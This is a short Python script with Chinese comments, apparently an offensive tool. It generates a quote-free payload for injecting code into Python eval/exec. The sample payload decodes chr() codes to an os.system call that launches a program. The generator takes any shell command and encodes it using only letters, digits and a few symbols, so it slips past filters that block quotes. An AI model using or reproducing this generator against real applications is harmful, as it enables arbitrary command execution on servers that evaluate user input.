#by leeya_bug

#无引号版只包含 _ , ( , ) , + , . , a-z , A-Z , 0-9 这几种字符
#适用于eval、exec等函数

#Payload: 
if False:
    eval(eval('chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(108)+chr(99)+chr(39)+chr(41)'))

#Payload生成
import base64

cmd = input('请输入命令: ')
a = f'''_import__('os').system('{cmd}')'''
res = 'chr(95)'
for i in a:
    res += f'+chr({ord(i)})'
res = 'eval(eval(' + res + '))' 
print(res)